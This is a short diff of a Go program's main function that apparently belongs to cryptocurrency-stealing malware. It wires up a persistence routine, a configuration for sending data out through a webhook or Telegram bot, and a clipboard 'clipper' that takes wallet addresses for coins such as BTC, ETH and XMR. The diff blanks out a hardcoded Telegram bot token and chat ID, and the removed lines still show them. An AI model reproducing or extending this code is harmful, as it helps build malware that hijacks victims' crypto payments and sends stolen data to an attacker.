@@ -32,8 +32,8 @@ var taskPersistenceFunc = taskpersistence.Run
 func main() {
 	CONFIG := map[string]interface{}{
 		"webhook": "",
-		"telegram_bot_token": "7371522678:AAEEXtQLnfe_22cLHpNqz3_PHkHfiEWeeuQ",
-		"telegram_chat_id":   "8177009199",
+		"telegram_bot_token": " ",
+		"telegram_chat_id":   " ",
 		"cryptos": map[string]string{
 			"BTC": "", "BCH": "", "ETH": "", "XMR": "", "LTC": "",
 			"XCH": "", "XLM": "", "TRX": "", "ADA": "", "DASH": "", "DOGE": "",
@@ -72,3 +72,4 @@ func main() {
 
 	clipper.Run(CONFIG["cryptos"].(map[string]string))
 }
+
